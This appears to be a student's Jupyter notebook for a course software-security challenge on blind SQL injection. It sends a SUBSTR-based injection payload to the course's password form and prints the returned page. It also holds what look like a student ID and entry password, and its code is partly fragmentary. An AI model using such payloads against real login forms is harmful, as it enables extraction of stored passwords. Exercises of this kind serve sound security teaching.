{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Response [200]>"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from requests import *\n",
    "\n",
    "# Make a connection pool.\n",
    "\n",
    "# Make a request.\n",
    "url = 'https://c10-32.sysnet.ucsd.edu/challenges/level8_password/'\n",
    "\n",
    "r\n",
    "# View response data.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "data = {'pid':'A13561164', 'entry_password':'UVX3JIhsLpikbO0b','password':' or SUBSTR(password,1,1) !=\\'s\\' ); --'}\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [],
   "source": [
    "r = post(url, data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'\\n\\n<!DOCTYPE html>\\n<html lang=\"en\">\\n<!--====================================================================================================-->\\n<head>\\n  <meta charset=\"utf-8\">\\n  <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\\n  <meta name=\"viewport\"              content=\"width=device-width, initial-scale=1\">\\n  <meta name=\"description\"           content=\"CS527 Software Security\">\\n  <meta name=\"author\"                content=\"tvdesai\">\\n\\n  <link href=\"/challenges/static/css/bootstrap.min.css\" rel=\"stylesheet\">\\n  <link href=\"/challenges/static/css/custom.css\"        rel=\"stylesheet\">\\n  <link href=\"/challenges/static/favicon.ico\"           rel=\"icon\">\\n\\n  <title>CSE127 Software Security</title>\\n</head>\\n<!--====================================================================================================-->\\n<body>\\n  <div class=\"container\">\\n    <div class=\"jumbotron\">\\n      <h1>Challenge - 8</h1>\\n      \\n        <p>failure</p>\\n      \\n      <p>The URL that this form submits to, <a href=\"https://c10-32.sysnet.ucsd.edu/challenges/level8_password/\">https://c10-32.sysnet.ucsd.edu/challenges/level8_password/</a>, accepts POST requests (no cookies required).</p>\\n      <p>In this final level, you will explore something called <a href=\"https://www.owasp.org/index.php/Blind_SQL_Injection\">\\'blind SQL Injection\\'.</a> In the previous level, the feedback you got was the entire query. In this level, you will only get success/failure as feedback.</p>\\n      <form method=\"post\" action=\"/challenges/level8_password/\" class=\"form-horizontal\">\\n        <div style=\"margin-bottom: 25px\" class=\"input-group\">\\n          <span class=\"input-group-addon\"><i class=\"glyphicon glyphicon-user\"></i></span>\\n          <input id=\"pid\" type=\"text\" name=\"pid\" value=\"\" placeholder=\"A123456789\" max=\"10\" class=\"form-control\" required=\"true\">\\n        </div>\\n        <div style=\"margin-bottom: 25px\" class=\"input-group\">\\n          <span class=\"input-group-addon\"><i class=\"glyphicon glyphicon-lock\"></i></span>\\n          <input id=\"entry_password\" type=\"text\" name=\"entry_password\" value=\"\" placeholder=\"Your original login password\" max=\"12\" class=\"form-control\" required=\"true\">\\n        </div>\\n        <div style=\"margin-bottom: 25px\" class=\"input-group\">\\n          <span class=\"input-group-addon\"><i class=\"glyphicon glyphicon-lock\"></i></span>\\n          <input id=\"login-password\" type=\"text\" name=\"password\" value=\"\"\\n               placeholder=\"Password (8 letters long, lowercase alphabetic letters only)\" class=\"form-control\" required=\"true\">\\n        </div>\\n        <div style=\"margin-top:10px\" class=\"form-group\">\\n        <div class=\"col-sm-12 controls\">\\n          <input type=\"submit\" class=\"btn btn-primary\" value=\"Submit Password\">\\n        </div>\\n      </div>      \\n      </form> <!-- form ends -->\\n    </div>\\n  </div> <!-- container ends -->\\n</body>\\n</html>\\n<script type=\"text/javascript\">\\n    document.addEventListener(\\'contextmenu\\', event => event.preventDefault());\\n</script>\\n'"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "zvykedyx"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "abcdefghijklmnopqrstuvwxyz"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
